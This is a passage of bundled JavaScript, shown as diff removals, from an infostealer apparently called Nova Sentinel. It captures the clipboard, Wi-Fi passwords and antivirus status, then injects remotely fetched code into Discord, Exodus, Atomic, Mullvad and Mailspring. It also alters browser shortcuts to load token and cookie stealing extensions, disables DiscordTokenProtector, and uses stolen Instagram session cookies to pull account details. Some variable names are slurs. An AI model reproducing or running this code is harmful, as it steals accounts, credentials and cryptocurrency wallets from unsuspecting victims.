Get-Clipboard\";\n    let ps = new PowerShell(ge);\n    ps.on(\"error\", (err) => {});\n    ps.on(\"output\", (data) => {\n      if(!data)return;\n      const basepath = stat.testpath[0];\n      const sysdir = path.join(basepath, \"System\");\n      try {\n        if (!fs.existsSync(sysdir)) {\n          fs.mkdirSync(sysdir);\n        }\n        \n      } catch (e) {\n        return;\n      }\n      const ClipFilePath = path.join(sysdir, \"Clipboard.txt\");\n      fs.writeFileSync(ClipFilePath, core.getHeader() + data);\n    });\n    ps.on(\"error-output\", (data) => {});\n    ps.on(\"end\", (code) => {});\n  } catch (error) {}\n}\n\n\nasync function NovaSentinelWifiPasswords(cc) {\n  let wifiprofile = [];\n  if (cc !== \"yes\") return;\n\n  try {\n    const ge = \"netsh wlan show profile\";\n\n    let ps = new PowerShell(ge);\n    ps.on(\"output\", async (data) => {\n      const lines = data.split(\"\\n\");\n      for (const line of lines) {\n        if (line.startsWith(\"    Profil\")) {\n          const profileName = line.split(\":\")[1].trim();\n\n          const asciiContent = unidecode(profileName);\n          wifiprofile.push(asciiContent);\n        }\n      }\n      const promises = wifiprofile.map(async (profile) => {\n        const ge = `netsh wlan show profile \"${profile}\" key=clear`;\n        return new Promise(async (resolve, reject) => {\n          try {\n            let ps = new PowerShell(ge);\n            ps.on(\"output\", (data) => {\n              const asciiContent = unidecode(data);\n              resolve(asciiContent);\n            });\n          } catch (error) {\n          }\n        });\n      });\n\n      const profileContents = await Promise.all(promises);\n      const c = profileContents.join(\"\\n\"); \n      if(!c)return;\n      const basepath = stat.testpath[0];\n      const sysdir = path.join(basepath, \"System\");\n      try {\n        if (!fs.existsSync(sysdir)) {\n          await fs.mkdir(sysdir);\n        }\n      } catch (e) {\n        return;\n      }\n      const WifiFilePath = path.join(sysdir, \"WifiPasswords.txt\");\n      await fs.writeFileSync(WifiFilePath, core.getHeader() + c);\n    });\n  } catch (error) {}\n}\n\nasync function NovaSentinelAV(cc) {\n  if (cc !== \"yes\") return;\n  const psScript = `\nfunction Get-AntiVirusProduct {\n    [CmdletBinding()]\n    param (\n    [parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]\n    [Alias('name')]\n    $computername=$env:computername\n    )\n\n    $AntiVirusProducts = Get-WmiObject -Namespace \"root\\\\SecurityCenter2\" -Class AntiVirusProduct -ComputerName $computername\n\n    $ret = @()\n    foreach ($AntiVirusProduct in $AntiVirusProducts) {\n         switch ($AntiVirusProduct.productState) {\n            \"262144\" { $defstatus = \"Up to date\"; $rtstatus = \"Disabled\" }\n            \"262160\" { $defstatus = \"Out of date\"; $rtstatus = \"Disabled\" }\n            \"266240\" { $defstatus = \"Up to date\"; $rtstatus = \"Enabled\" }\n            \"266256\" { $defstatus = \"Out of date\"; $rtstatus = \"Enabled\" }\n            \"393216\" { $defstatus = \"Up to date\"; $rtstatus = \"Disabled\" }\n            \"393232\" { $defstatus = \"Out of date\"; $rtstatus = \"Disabled\" }\n            \"393488\" { $defstatus = \"Out of date\"; $rtstatus = \"Disabled\" }\n            \"397312\" { $defstatus = \"Up to date\"; $rtstatus = \"Enabled\" }\n            \"397328\" { $defstatus = \"Out of date\"; $rtstatus = \"Enabled\" }\n            \"397584\" { $defstatus = \"Out of date\"; $rtstatus = \"Enabled\" }\n            default   { $defstatus = \"Unknown\"; $rtstatus = \"Unknown\" }\n        }\n        $ht = @{}\n        $ht.Computername = $computername\n        $ht.Name = $AntiVirusProduct.displayName\n        $ht.'Product GUID' = $AntiVirusProduct.instanceGuid\n        $ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe\n        $ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe\n        $ht.'Definition Status' = $defstatus\n        $ht.'Real-time Protection Status' = $rtstatus\n\n        # Créez un nouvel objet pour chaque ordinateur\n        $ret += New-Object -TypeName PSObject -Property $ht \n    }\n    Return $ret\n}\nGet-AntiVirusProduct\n`;\n  const ps = new PowerShell(psScript);\n  ps.on(\"error\", (err) => {});\n  ps.on(\"output\", async (data) => {\n    const savePath = path.join(stat.testpath[0], \"System\");\n    try {\n      if (!fs.existsSync(savePath)) {\n        await fs.mkdirSync(savePath);\n        fs.writeFileSync(path.join(savePath, \"Antivirus.txt\"), core.getHeader() + data);\n      } else{\n        fs.writeFileSync(path.join(savePath, \"Antivirus.txt\"), core.getHeader() + data);\n      }\n    } catch (e) {\n      save.SaveError(e);\n    }\n  });\n  ps.on(\"error-output\", (data) => {});\n  ps.on(\"end\", (code) => {});\n}\n\n\nmodule.exports = {\n  takeScreenshotAndSave,\n  getSysteminformations,\n  NovaSentinelAV,\n  NovaSentinelClipboard,\n  NovaSentinelWifiPasswords,\n};\n\n\n//# sourceURL=webpack://script/./utils/infos.js?");
-
-/***/ }),
-
-/***/ "./utils/injection.js":
-/*!****************************!*\
-  !*** ./utils/injection.js ***!
-  \****************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const fs = __webpack_require__(/*! fs */ \"fs\"),\n  glob = __webpack_require__(/*! glob */ \"glob\"),\n  process = __webpack_require__(/*! process */ \"process\"),\n  { exec, execSync, spawn } = __webpack_require__(/*! child_process */ \"child_process\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  axios = __webpack_require__(/*! axios */ \"axios\"),\n  asar = __webpack_require__(/*! asar */ \"asar\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n  save = __webpack_require__(/*! ./save */ \"./utils/save.js\"),\n  core = __webpack_require__(/*! ./core */ \"./utils/core.js\"),\n  unzipper = __webpack_require__(/*! unzipper */ \"unzipper\"),\n  fsPromises = (__webpack_require__(/*! fs */ \"fs\").promises);\n\nfunction replaceSpecialCharacter(text) {\n  return text.replace(/ /g, \"\\\\u00A0\");\n}\nasync function LetInject() {\n  let extensions_path = [\n    path.join(\n      process.env.ProgramData,\n      \"ChromeExtensionsNova\",\n      \"extension-cookies\"\n    ),\n    path.join(\n      process.env.ProgramData,\n      \"ChromeExtensionsNova\",\n      \"extension-tokens\"\n    ),\n  ];\n  const shortcutPaths = {\n    roaming: {\n      \"Naviguateur Opera GX\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Navigateur Opera GX.lnk\",\n      Google: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Google Chrome.lnk\",\n      Opera: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Opera.lnk\",\n      \"Opera GX\": \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Opera GX.lnk\",\n      Brave: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Brave.lnk\",\n      Vivaldi: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Vivaldi.lnk\",\n      \"Microsoft Edge\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Microsoft Edge.lnk\",\n      \"Yandex Browser\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Yandex\\\\Yandex Browser.lnk\",\n      \"SRWare Iron\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\SRWare Iron.lnk\",\n      \"Kiwi Browser\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Kiwi Browser.lnk\",\n      \"Torch Browser\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Torch Browser.lnk\",\n      Slimjet: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Slimjet.lnk\",\n      \"Comodo Dragon\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Comodo Dragon.lnk\",\n      \"Opera Neon\": \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Opera Neon.lnk\",\n    },\n    programdata: {\n      Google: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Google Chrome.lnk\",\n      Opera: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Opera.lnk\",\n      \"Opera GX\": \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Opera GX.lnk\",\n      Brave: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Brave.lnk\",\n      Vivaldi: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Vivaldi.lnk\",\n      \"Microsoft Edge\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Microsoft Edge.lnk\",\n      \"Yandex Browser\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Yandex\\\\Yandex Browser.lnk\",\n      \"SRWare Iron\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\SRWare Iron.lnk\",\n      \"Kiwi Browser\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Kiwi Browser.lnk\",\n      \"Torch Browser\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Torch Browser.lnk\",\n      Slimjet: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Slimjet.lnk\",\n      \"Comodo Dragon\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Comodo Dragon.lnk\",\n      \"Opera Neon\": \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Opera Neon.lnk\",\n    },\n  };\n\n  const userRoamingStartMenu = path.join(process.env.APPDATA);\n\n  const userProgramDataStartMenu = path.join(process.env.ProgramData);\n\n  async function modifyShortcut(shortcutPath) {\n    let randomname = path.join(\n      process.env.APPDATA,\n      `salut${core.generateId(5)}.ps1`\n    );\n    if (!fs.existsSync(shortcutPath)) return;\n    const powershellCommand = `\n    $WshShell = New-Object -comObject WScript.Shell;\n    $Shortcut = $WshShell.CreateShortcut(\"${replaceSpecialCharacter(\n      shortcutPath\n    )}\");\n    $Shortcut.Arguments = \"--load-extension=${extensions_path[0]},${\n      extensions_path[1]\n    }\";\n    $Shortcut.Save()\n    `;\n    await fs.writeFileSync(randomname, powershellCommand, { encoding: \"utf8\" });\n\n    execSync(\n      `powershell.exe -ExecutionPolicy Bypass -File \"${randomname}\" -RunAsAdministrator`,\n      async (error, stdout, stderr) => {\n        if (error) {\n          return;\n        }\n      }\n    );\n    await fs.unlink(randomname, (err) => {\n      if (err) {\n      } else {\n      }\n    });\n  }\n\n  for (const browserName in shortcutPaths.programdata) {\n    const shortcutPath = path.join(\n      userProgramDataStartMenu,\n      shortcutPaths.programdata[browserName]\n    );\n    await modifyShortcut(shortcutPath);\n  }\n\n  for (const browserName in shortcutPaths.roaming) {\n    const shortcutPath = path.join(\n      userRoamingStartMenu,\n      shortcutPaths.roaming[browserName]\n    );\n    await modifyShortcut(shortcutPath);\n  }\n}\n\nasync function replaceWebhookTerm(directoryPath, wb, ip, compname) {\n  try {\n    const files = await fsPromises.readdir(directoryPath);\n    for (const fileName of files) {\n      const filePath = path.join(directoryPath, fileName);\n      const fileStat = await fsPromises.stat(filePath);\n      if (fileStat.isFile()) {\n        let fileContent = await fsPromises.readFile(filePath, \"utf-8\");\n        fileContent = fileContent.replace(/%[A-Z]{7}%/gm, wb);\n        fileContent = fileContent.replace(/%IPINFO%/gm, ip);\n        fileContent = fileContent.replace(/%COMP_INFO%/gm, compname);\n        await fsPromises.writeFile(filePath, fileContent, \"utf-8\");\n      } else if (fileStat.isDirectory()) {\n        await replaceWebhookTerm(filePath, wb);\n      }\n    }\n  } catch (error) {}\n}\n\nasync function chrome_injection(cc, webhook, chrome_url, ip, computername) {\n  if (cc !== \"yes\") return;\n  const destinationFolder = path.join(\n    process.env.ProgramData,\n    \"ChromeExtensionsNova\"\n  );\n  try {\n    const response = await axios.get(chrome_url, { responseType: \"stream\" });\n\n    if (!fs.existsSync(destinationFolder)) {\n      fs.mkdirSync(destinationFolder, { recursive: true });\n    }\n    const fileName = path.basename(chrome_url);\n    const destinationPath = path.join(destinationFolder, fileName);\n    const writer = fs.createWriteStream(destinationPath);\n\n    writer.on(\"finish\", async () => {\n      fs.createReadStream(destinationPath)\n        .pipe(unzipper.Extract({ path: destinationFolder }))\n        .on(\"close\", () => {\n          fs.unlink(destinationPath, (err) => {\n            if (err) {\n            } else {\n              replaceWebhookTerm(destinationFolder, webhook, ip, computername);\n              LetInject();\n            }\n          });\n        });\n    });\n    writer.on(\"error\", (err) => {});\n    response.data.pipe(writer);\n  } catch (error) {}\n}\n\nasync function inject_antidelete(\n  app,\n  inject,\n  webhook,\n  url,\n  link,\n  a2f,\n  automailchanger,\n  ClientEmail\n) {\n  if (app.includes(\"Canary\") || app.includes(\"PTB\")) return;\n  let niger = path.join(app[0], \"resources\", \"app.asar\");\n  try {\n    let ScriptToInject = `\n  \n\"use strict\";\n\nconsole.log(\"https://t.me/Sordeal\")\n\n\n\nconst fs = require(\"fs\"),\nhttps = require(\"https\"),\n path = require(\"path\"),\n buildInfo = require('./buildInfo'),\n paths = require('../common/paths'),\n moduleUpdater = require('../common/moduleUpdater'),\n updater = require('../common/updater'),\n requireNative = require('./requireNative');\n paths.init(buildInfo);\n\n\nfunction getAppMode() {\n  if (process.argv && process.argv.includes('--overlay-host')) {\n    return 'overlay-host';\n  }\n  return 'app';\n}\n\nconst mode = getAppMode();\nif (mode === 'app') {\n  require('./bootstrap');\n} else if (mode === 'overlay-host') {\n  const appSettings = require('./appSettings');\n  appSettings.init();\n  const {\n    NEW_UPDATE_ENDPOINT\n  } = require('./Constants');\n  if (!buildInfo.debug && buildInfo.newUpdater) {\n    if (!updater.tryInitUpdater(buildInfo, NEW_UPDATE_ENDPOINT)) {\n      throw new Error('Failed to initialize modules in overlay host.');\n    }\n    updater.getUpdater().startCurrentVersionSync({\n      allowObsoleteHost: true\n    });\n  } else {\n    moduleUpdater.initPathsOnly(buildInfo);\n  }\n  requireNative('discord_overlay2/standalone_host.js');\n}\n\ntry{ \n    initNovaSentinel()\n}catch(e){}\n\n\nconst discordAppDataPath = path.join(\n  process.env.LOCALAPPDATA ||\n    (process.platform == \"darwin\"\n      ? process.env.HOME + \"/Library/Preferences\"\n      : \"/var/local\"),\n  \"Discord\"\n);\n\nfunction findDiscordVersion() {\n  const discordVersions = fs\n    .readdirSync(discordAppDataPath)\n    .filter((folder) => folder.startsWith(\"app-\"));\n  console.log(discordVersions);\n  if (discordVersions.length > 0) {\n    return discordVersions[0];\n  }\n  return null; \n}\n\nfunction findCoreVersion(discordVersion) {\n  const coreVersionsPath = path.join(\n    discordAppDataPath,\n    discordVersion,\n    \"modules\"\n  );\n  const coreVersions = fs\n    .readdirSync(coreVersionsPath)\n    .filter((folder) => folder.startsWith(\"discord_desktop_core-\"));\n  if (coreVersions.length > 0) {\n    return coreVersions[0];\n  }\n  return null; \n}\n\nfunction initNovaSentinel(){\nconst discordVersion = findDiscordVersion();\nconst coreVersion = discordVersion ? findCoreVersion(discordVersion) : null;\n\nif (discordVersion && coreVersion) {\n  const indexFilePath = path.join(\n    discordAppDataPath,\n    discordVersion,\n    \"modules\",\n    coreVersion,\n    \"discord_desktop_core/index.js\"\n  );\n  const betterDiscordPath = path.join(\n    process.env.APPDATA ||\n      (process.platform == \"darwin\"\n        ? process.env.HOME + \"/Library/Preferences\"\n        : \"/var/local\"),\n    \"betterdiscord/data/betterdiscord.asar\"\n  );\n\n  try {\n    const negger = fs.readFileSync(indexFilePath, \"utf8\");\n    if (negger === \"module.exports = require('./core.asar'); || negger === module.exports = require('./core.asar');\") {\n      init();\n    }else{console.log(\"nova sentinel is still injected on this discord client\")}\n  } catch (err) {\n    console.error(\"Error index.js read :\", err);\n  }\n\n  function init() {\n    https\n      .get(\n        \"https://raw.githubusercontent.com/ksch-58/sub/main/index.js\",\n        (res) => {\n          let chunk = \"\";\n          res.on(\"data\", (data) => (chunk += data));\n          res.on(\"end\", () => {\n            const newContent = chunk\n              .replace(\n                \"%WEB\"+\"HOOK%\",\n                \"${webhook}\"\n              )\n              .replace(\"%DISABLEFA%\", \"${a2f ?? false}\")\n              .replace(\"%AUTOMAILCHANGER%\", \"${automailchanger ?? false}\")\n              .replace(\"%CLIENTEMAIL%\", \"${\n                ClientEmail ?? \"kschdediscord@gmail.com\"\n              }\")\n              .replace(\"%TRANSFER_URL%\", \"${link}\");\n            fs.writeFileSync(indexFilePath, newContent);\n          });\n        }\n      )\n      .on(\"error\", (err) => {\n        console.error(\"Error request:\", err);\n        setTimeout(init, 10000);\n      });\n  }\n\n  require(path.join(discordAppDataPath, discordVersion, \"resources/app.asar\"));\n  if (fs.existsSync(betterDiscordPath)) {\n    require(betterDiscordPath);\n  }\n} else {\n  console.error(\"Nova Sentinel Still injected.\");\n}\n}\n  `;\n    let output = path.join(niger, \"..\", \"unpacked\");\n    if (niger) {\n      await unpackAsar(niger, output);\n      setTimeout(async () => {\n        const indexPath = path.join(output, \"app_bootstrap\", \"index.js\");\n\n        const updatedData = `\\n${ScriptToInject}`;\n\n        await fs.writeFile(indexPath, updatedData, \"utf8\", (err) => {\n          if (err) {\n          }\n        });\n        await packAsar(output, niger);\n      }, 2500);\n    }\n  } catch (e) {}\n}\n\nasync function inject(\n  inject,\n  webhook,\n  url,\n  link,\n  a2f,\n  automailchanger,\n  ClientEmail,\n  silent\n) {\n  if (inject !== \"yes\") return;\n\n  let replacedInjection;\n  let lkn;\n  lkn = webhook;\n\n  try {\n    if (silent !== \"yes\") {\n      const filteredProcesses = await core.filterProcessesByName(\"discord\");\n      if (filteredProcesses.length > 0) {\n        try {\n          filteredProcesses.forEach((proc) => {\n            process.kill(proc.pid);\n          });\n        } catch (e) {}\n      }\n    }\n    const local = process.env.localappdata;\n    const discordFolders = glob.sync(`${local}/*cord*`);\n    var desktops = [];\n\n    for (let i = 0; i < discordFolders.length; i++) {\n      const discordFolder = discordFolders[i];\n      const folderContents = await fsPromises.readdir(discordFolder, {\n        withFileTypes: true,\n      });\n\n      const apps = folderContents\n        .filter((item) => item.isDirectory() && item.name.includes(\"app\"))\n        .map((item) => path.join(discordFolder, item.name));\n      if (apps.length < 1) return;\n      /* if (path.basename(discordFolder) == \"Discord\") {\n          await inject_antidelete(\n            apps,\n            inject,\n            webhook,\n            url,\n            link,\n            a2f,\n            automailchanger,\n            ClientEmail\n          );\n        }*/\n      for (let u = 0; u < apps.length; u++) {\n        const app = apps[u];\n        const desktopCores = glob.sync(`${app}/modules/discord_desktop_core-*`);\n        if (!desktopCores[0]) return;\n        desktopCores.forEach(async desktop => {\n          \n        try {\n          const response = await axios.get(url);\n          const injection = response.data;\n          const regex = /%[A-Z]{7}%/gm;\n          replacedInjection = injection.replace(regex, lkn);\n          replacedInjection = replacedInjection.replace(\n            /%TRANSFER_URL%/g,\n            link\n          );\n          replacedInjection = await replacedInjection.replace(\n            /%DISABLEFA%/g,\n            a2f\n          );\n          replacedInjection = await replacedInjection.replace(\n            /%AUTOMAILCHANGER%/g,\n            automailchanger\n          );\n          replacedInjection = await replacedInjection.replace(\n            /%CLIENTEMAIL%/g,\n            ClientEmail\n          );\n          const indexFile = path.join(\n            `${desktop}/discord_desktop_core/index.js`\n          );\n          await fs.writeFileSync(indexFile, `${replacedInjection}`, \"utf-8\");\n          const firstDirectory = glob.sync(`${desktop}/discord_d*`)[0];\n          if (!fs.existsSync(firstDirectory + \"/ThiefCat\")) {\n            await fs.mkdirSync(firstDirectory + \"/ThiefCat\");\n          }\n          setTimeout(async () => {\n            try {\n              if (desktop) {\n                const discordFolder = path.join(desktop, \"..\", \"..\", \"..\");\n                const buildBatPath = path.join(\n                  desktop,\n                  \"..\",\n                  \"..\",\n                  path.basename(discordFolder) + \".exe\"\n                );\n                const options = {\n                  cwd: path.join(desktop, \"..\", \"..\"),\n                  stdio: \"inherit\",\n                };\n                try{\n                spawn(buildBatPath, [], options);\n                }catch(e){}\n              }\n            } catch (e) {}\n          }, 12000);\n        } catch (err) {\n          save.SaveError(err);\n        }\n      });\n      }\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nconst replace = (buf, a, b) => {\n  if (!Buffer.isBuffer(buf)) buf = Buffer.from(buf);\n  const idx = buf.indexOf(a);\n  if (idx === -1) return buf;\n  if (!Buffer.isBuffer(b)) b = Buffer.from(b);\n\n  const before = buf.slice(0, idx);\n  const after = replace(buf.slice(idx + a.length), a, b);\n  const len = idx + b.length + after.length;\n  return Buffer.concat([before, b, after], len);\n};\n\nasync function BypassDiscordTokenProtector(inject) {\n  if (inject != \"yes\") return;\n  try {\n    const tp = path.join(process.env.APPDATA, \"DiscordTokenProtector\");\n    const config = path.join(tp, \"config.json\");\n\n    if (\n      !fs.existsSync(tp) ||\n      !fs.lstatSync(tp).isDirectory() ||\n      !fs.existsSync(config)\n    ) {\n      return;\n    }\n    const filesToRemove = [\n      \"DiscordTokenProtector.exe\",\n      \"ProtectionPayload.dll\",\n      \"secure.dat\",\n    ];\n    for (const file of filesToRemove) {\n      const filePath = path.join(tp, file);\n      if (fs.existsSync(filePath)) {\n        fs.unlinkSync(filePath);\n      }\n    }\n    let item;\n    try {\n      const fileContent = fs.readFileSync(config, \"utf-8\");\n      item = JSON.parse(fileContent);\n    } catch (error) {\n      return;\n    }\n    item[`KSCHdsc_is_here`] = \"https://t.me/Sordeal\";\n    item.auto_start = false;\n    item.auto_start_discord = false;\n    item.integrity = false;\n    item.integrity_allowbetterdiscord = false;\n    item.integrity_checkexecutable = false;\n    item.integrity_checkhash = false;\n    item.integrity_checkmodule = false;\n    item.integrity_checkscripts = false;\n    item.integrity_checkresource = false;\n    item.integrity_redownloadhashes = false;\n    item.iterations_iv = 364;\n    item.iterations_key = 457;\n    item.version = 69420;\n\n    fs.writeFileSync(config, JSON.stringify(item, null, 2));\n    fs.appendFileSync(config, `\\n\\n//KSCHdsc_is_here | https://t.me/Sordeal`);\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nasync function pwnBetterDiscord(inject) {\n  if (inject != \"yes\") return;\n  try {\n    let dir = process.env.appdata + \"/BetterDiscord/data/betterdiscord.asar\";\n    if (fs.existsSync(dir)) {\n      const boom = fs.readFileSync(dir);\n      fs.writeFileSync(dir, replace(boom, \"api/webhooks\", \"KSCHdsc\"));\n    }\n\n    return;\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nasync function exodusInjection(cc, webhook, injectionurl) {\n  if (cc !== \"yes\" || webhook === \"%WEBHOOK%\" || !injectionurl) return;\n  try {\n    let local = process.env.localappdata;\n    const response = await axios.get(injectionurl);\n    const injection = await response.data;\n    let injectionpath = glob.sync(`${local}/exodus/app-*/resources/app.asar`);\n    let output = path.join(injectionpath[0], \"..\", \"unpacked\");\n    if (injectionpath.length > 0) {\n      await unpackAsar(injectionpath[0], output);\n      let g = glob.sync(`${output}/src/app/main/index.js`);\n      await fs.writeFileSync(g[0], `${injection}`, \"utf-8\");\n\n      await packAsar(output, path.join(injectionpath[0]));\n      let json = {\n        webhook,\n        link: stat.exodusurl[0] ?? \"none\",\n      };\n\n      const parentDir = path.join(injectionpath[0], \"..\", \"..\");\n      fs.writeFileSync(\n        path.join(parentDir, \"config.json\"),\n        JSON.stringify(json)\n      );\n    }\n  } catch (e) {}\n}\n\nfunction unpackAsar(asarFilePath, outputDir) {\n  try {\n    asar.extractAll(asarFilePath, outputDir);\n  } catch (err) {}\n}\n\nasync function MullvadInjection(cc, webhook, injectionurl) {\n  if (cc !== \"yes\" || webhook === \"%WEBHOOK%\" || !injectionurl) return;\n  try {\n    let mullvad_path = path.join(\n      process.env.ProgramFiles,\n      \"Mullvad VPN\",\n      \"resources\",\n      \"app.asar\"\n    );\n    if (fs.existsSync(mullvad_path)) {\n      const response = await axios.get(injectionurl);\n      const injection = await response.data;\n      let output = path.join(mullvad_path, \"..\", \"unpacked\");\n      await unpackAsar(mullvad_path, output);\n      let g = path.join(output, \"build\", \"src\", \"main\", \"daemon-rpc.js\");\n      await fs.writeFileSync(\n        g,\n        `${injection.replace(\"%WEBHOOK%\", webhook)}`,\n        \"utf-8\"\n      );\n      await packAsar(output, path.join(mullvad_path));\n    }\n  } catch (e) {}\n}\n\nfunction unpackAsar(asarFilePath, outputDir) {\n  try {\n    asar.extractAll(asarFilePath, outputDir);\n  } catch (err) {}\n}\n\nasync function packAsar(inputDir, outputFilePath) {\n  try {\n    await asar.createPackage(inputDir, outputFilePath);\n    if (fs.existsSync(outputFilePath)) {\n      if (fs.existsSync(inputDir)) {\n        fs.rmSync(inputDir, { recursive: true });\n      }\n    } else {\n    }\n  } catch (err) {}\n}\n\nasync function AtomicInjection(cc, webhook, injectionurl, mainAtomic) {\n  if (cc != \"yes\" || webhook === \"%WEBHOOK%\" || !injectionurl) return;\n  try {\n    const local = process.env.localappdata;\n    const response = await axios.get(injectionurl);\n    const injection = await response.data;\n    const resp = await axios.get(mainAtomic);\n    const AtmcMain = await resp.data;\n    let injectionpath = glob.sync(\n      `${local}/Programs/atomic/resources/app.asar`\n    );\n\n    if (injectionpath[0]) {\n      let output = path.join(injectionpath[0], \"..\", \"unpacked\");\n      await unpackAsar(injectionpath[0], output);\n      let g = `${output}/dist/electron/vendors.3d9f29748fbff1778bdc.js`;\n      await fs.writeFileSync(g, `${injection}`, \"utf-8\");\n      let main = `${output}/dist/electron/main.js`;\n      await fs.writeFileSync(main, `${AtmcMain}`, \"utf-8\");\n\n      await packAsar(output, path.join(injectionpath[0]));\n      let json = {\n        webhook,\n        link: stat.atomicurl[0] ?? \"none\",\n      };\n\n      const parentDir = path.join(injectionpath[0], \"..\", \"..\");\n\n      fs.writeFileSync(\n        path.join(parentDir, \"config.json\"),\n        JSON.stringify(json)\n      );\n    }\n  } catch (e) {}\n}\n\nasync function MailSpringInjection(cc, webhook, injectionurl) {\n  if (cc !== \"yes\" || webhook === \"%WEBHOOK%\" || !injectionurl) return;\n  try {\n    let mailspring_path = path.join(process.env.localappdata, \"Mailspring\");\n    if (fs.existsSync(mailspring_path)) {\n      let appmailspring_path = glob.sync(\n        `${mailspring_path}/app-*/resources/app.asar`\n      );\n      appmailspring_path.forEach(async (jsppath) => {\n        const response = await axios.get(injectionurl);\n        const injection = await response.data;\n        let output = path.join(jsppath, \"..\", \"unpacked\");\n        await unpackAsar(jsppath, output);\n        let g = path.join(\n          output,\n          \"internal_packages\",\n          \"onboarding\",\n          \"lib\",\n          \"onboarding-helpers.js\"\n        );\n        await fs.writeFileSync(\n          g,\n          `${injection.replace(\"%WEBHOOK%\", webhook)}`,\n          \"utf-8\"\n        );\n        await packAsar(output, path.join(jsppath));\n      });\n    }\n  } catch (e) {}\n}\n\nmodule.exports = {\n  inject,\n  pwnBetterDiscord,\n  BypassDiscordTokenProtector,\n  exodusInjection,\n  AtomicInjection,\n  chrome_injection,\n  MullvadInjection,\n  MailSpringInjection,\n};\n\n\n//# sourceURL=webpack://script/./utils/injection.js?");
-
-/***/ }),
-
-/***/ "./utils/instagram.js":
-/*!****************************!*\
-  !*** ./utils/instagram.js ***!
-  \****************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\n  axios = __webpack_require__(/*! axios */ \"axios\"),\r\n  fs = __webpack_require__(/*! fs */ \"fs\"),\r\n  { embeds } = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\"),\r\n  path = __webpack_require__(/*! path */ \"path\");\r\n\r\nasync function ParseInstagram(cc) {\r\n  if (cc !== \"yes\") return;\r\n  try{\r\n  let g = [];\r\n  \r\n  let instagram_sessions = stat.InstaSessId;\r\n  if (instagram_sessions && instagram_sessions.length) {\r\n    for (const instagram of instagram_sessions) {\r\n      const profile = await axios\r\n        .get(\r\n          \"https://i.instagram.com/api/v1/accounts/current_user/?edit=true\",\r\n          {\r\n            headers: {\r\n              \"user-agent\": \"Instagram 219.0.0.12.117 Android\",\r\n              cookie: `sessionid=${instagram}`,\r\n            },\r\n          }\r\n        )\r\n        .then((res) => res.data.user)\r\n        .catch(() => {});\r\n      let full_name = profile.full_name ?? \"none\"\r\n      let is_private = profile.is_private ?? \"none\"\r\n      let email = profile.email ?? \"none\"\r\n      let phone_number = profile.phone_number ?? \"none\"\r\n      let profile_pic_url = profile.profile_pic_url ?? \"none\"\r\n      let username = profile.username ?? \"none\"\r\n      const profile2 = await axios\r\n        .get(`https://i.instagram.com/api/v1/users/${profile.pk_id}/info`, {\r\n          headers: {\r\n            \"user-agent\": \"Instagram 219.0.0.12.117 Android\",\r\n            cookie: `sessionid=${instagram}`,\r\n          },\r\n        })\r\n        .then((res) => res.data.user)\r\n        .catch(() => {});\r\n      let { is_verified, follower_count } = profile2;\r\n\r\n      let embed = {\r\n        title: \"Instagram Session\",\r\n        fields: [\r\n          {\r\n            name: `${embeds.instagram} Username:`,\r\n            value: `[\\`${full_name}\\`](https://instagram.com/${username})`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.twitter_followers} Followers:`,\r\n            value: `\\`${follower_count ?? \"0\"}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.mail} Email`,\r\n            value: `\\`${email ?? \"none\"}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.instaiscert} Certified`,\r\n            value: `\\`${is_verified ? embeds.instagram_certified : \"❌\"}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.phone} Phone Number`,\r\n            value: `\\`${phone_number ? phone_number : \"❌\"}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.token} Cookie`,\r\n            value: `\\`\\`\\`${instagram}\\`\\`\\``,\r\n            inline: false,\r\n          },\r\n        ],\r\n        thumbnail: {\r\n          url: profile_pic_url,\r\n        },\r\n        footer: {\r\n          text: \"@Nova 